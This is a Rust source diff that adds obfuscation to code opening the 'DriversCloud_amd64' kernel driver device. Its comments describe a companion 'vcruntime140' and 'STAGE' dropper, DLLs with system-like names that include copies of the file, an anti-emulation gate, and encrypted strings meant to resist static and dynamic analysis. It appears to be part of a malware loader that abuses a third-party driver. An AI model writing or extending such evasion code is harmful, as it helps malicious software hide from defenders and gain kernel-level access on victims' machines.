@@ -9,8 +9,21 @@ use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, INVALID_
 use windows_sys::Win32::Storage::FileSystem::CreateFileW;
 use windows_sys::Win32::System::IO::DeviceIoControl;
 
+use crate::obf::{self, E_DEVICE_PATH};
 use crate::utils::to_wide;
 
+/// Returns a freshly decrypted device path (same ck2 XOR as the vcruntime140 dropper).
+/// The intermediate plaintext is zeroed after use.
+pub fn device_path_wide() -> Vec<u16> {
+    obf::decrypt_path_to_wide(E_DEVICE_PATH)
+}
+
+// Legacy name kept only for source compatibility with include!'d copies of this file in the
+// sspiclient / mmdevlib / cloudstore DLLs. The value is still a plaintext literal in the source,
+// but the *primary runtime path* for DriversCloud.exe now uses the encrypted bytes + open_enc().
+// With the aggressive release profile (strip + lto) + LTO the dead const data has a good chance
+// of being removed from the final .exe image.
+#[deprecated(note = "use Device::open_enc() or obf-decrypted path instead")]
 pub const DEVICE_PATH: &str = "\\\\.\\DriversCloud_amd64";
 
 pub const PHYS_BUF_SIZE: usize = 0x1e8498;
@@ -58,6 +71,41 @@ impl Device {
                 winerr: unsafe { GetLastError() },
             });
         }
+        Ok(Self { h })
+    }
+
+    /// Open the driver device using the runtime-decrypted path (no plaintext
+    /// "\\\\.\\DriversCloud_amd64" literal is used at the call site).
+    /// Mirrors the "decrypt on use + zero after" pattern from vcruntime140.c.
+    /// Also runs the pop_quiz gate (same anti-emulation primitive as the STAGE dropper)
+    /// before talking to the kernel device.
+    pub fn open_enc() -> Result<Self> {
+        // Force the awkward volatile/xor/mul computation into the hot path.
+        // The presence + execution of this (and the 0xBEEF magic) is the point for
+        // static/dynamic analysis resistance, exactly as in vcruntime140.c.
+        let _quiz = obf::pop_quiz();
+
+        let wide = obf::decrypt_path_to_wide(E_DEVICE_PATH);
+        let h = unsafe {
+            CreateFileW(
+                wide.as_ptr(),
+                GENERIC_READ_WRITE,
+                0,
+                std::ptr::null(),
+                OPEN_EXISTING,
+                0,
+                std::ptr::null_mut(),
+            )
+        };
+        if h == INVALID_HANDLE_VALUE {
+            // Best-effort error without leaking the real path into the error text in all builds.
+            bail!(DcError::DeviceOpen {
+                path: "<obf-device>".to_string(),
+                winerr: unsafe { GetLastError() },
+            });
+        }
+        // wide goes out of scope here; its stack bytes are not explicitly zeroed by Vec drop,
+        // but the sensitive content only lived for the duration of this call (same as the C dropper's stack buf).
         Ok(Self { h })
     }
 
